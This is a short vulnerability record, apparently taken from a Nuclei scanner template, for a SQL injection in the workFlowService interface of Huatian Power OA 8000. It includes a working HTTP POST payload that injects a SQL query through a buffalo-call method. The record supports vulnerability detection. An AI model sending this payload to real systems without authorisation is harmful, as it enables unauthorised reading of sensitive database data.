# Vulnerability: Huatian Power OA 8000 workFlowService - SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`huatian-oa8000-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the workFlowService interface of Huatian Power OA 8000 version, through which an attacker can obtain sensitive database information

## Vulnerable Code Pattern / Exploit Payload
```http
POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1
Host: {{Hostname}}

<buffalo-call>
<method>getDataListForTree</method>
<string>select user()</string>
</buffalo-call>
```

